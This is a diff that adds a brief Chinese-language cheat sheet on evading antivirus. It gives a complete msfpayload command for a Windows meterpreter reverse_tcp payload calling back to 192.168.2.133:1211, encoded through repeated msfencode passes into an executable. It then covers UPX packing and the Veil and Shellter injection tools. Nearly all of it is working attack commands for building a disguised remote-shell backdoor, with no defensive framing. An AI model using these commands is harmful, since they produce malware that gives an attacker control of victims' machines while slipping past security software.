@@ -1,0 +1,15 @@
+多重编码免杀
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.2.133 LPORT=1211 R|
+msfencode -e x86/shikata_ga_nai -c 5 -t raw |
+msfencode -e x86/alpha_upper -c 2 -t raw |
+msfencode -e x86/shikata_ga_nai -c 5 -t raw |
+msfencode -e x86/countdown -c 5 -t exe -o /root/cc.exe
+
+加壳免杀
+upx -5 cc.exe
+
+veil免杀
+
+shellter免杀（shellcode代码注入工具）
+apt-get update
+apt-get install shellter
